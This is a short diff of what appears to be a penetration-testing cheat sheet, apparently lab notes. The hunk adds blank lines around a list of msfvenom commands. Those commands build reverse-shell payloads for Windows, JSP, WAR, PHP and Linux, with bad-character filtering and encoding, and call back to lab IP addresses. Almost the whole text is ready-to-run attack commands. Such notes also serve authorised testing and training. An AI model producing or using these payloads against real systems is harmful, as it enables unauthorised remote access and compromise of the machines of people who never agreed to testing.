@@ -122,10 +122,15 @@ badchars = (
 `msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.41 LPORT=9001 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -n 16 -f python`
 
 `msfvenom -p windows/shell_reverse_tcp -f exe-service -o payload.exe LHOST=10.11.0.41 LPORT=9001`
+
 `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f raw > shell.jsp`
+
 `msfvenom -p java/shell_reverse_tcp LHOST=10.11.0.41 LPORT=443 -f war > reverse_shell.war`
+
 `msfvenom -p php/reverse_php LHOST=10.11.0.33 LPORT=443 > /var/www/html/evil.txt`
+
 `msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > staged-shell.elf`
+
 `msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9001 -f elf > non-staged-shell.elf`
 
 # Generate bad characters
